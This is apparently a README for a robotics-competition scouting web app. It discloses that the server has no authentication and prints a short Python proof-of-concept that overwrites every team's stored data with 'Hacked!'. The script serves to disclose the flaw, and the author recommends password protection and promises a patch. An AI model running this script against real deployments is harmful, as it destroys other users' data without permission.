# FRCScoutingWebApp
Server ready scouting app. I'd recommend you password protect the domain (It's pretty easy to wipe out all server data by modifying scripts or by creating a program ping the server).

I made this simple script in a few minutes; it will wipe out all the information in the team files (and replace it with "Hacked!" because we gotta have some fun). 

```python
import requests
import json
import sys

url = str(sys.argv[1])
url1 = "http://"+url+"/php/getAllTeams.php"
url2 = "http://"+url+"/php/setTeamInfo.php?q="
text = requests.get(url1).text

while text.find(",,") != -1 or text.find("[,") != -1 or text.find(",]") != -1:
    text = text.replace(",,", ",").replace("[,", "[").replace(",]", "]")

data = json.loads(text)

for i in data:
    requests.post(url2+str(i["Number"]), data={'data':'Hacked!'})
```
It's unlikely anyone would want to destroy anything, but as proof of concept it shows it's not secure. A security patch will be put out in the future with the server side verifying that a change request is valid.
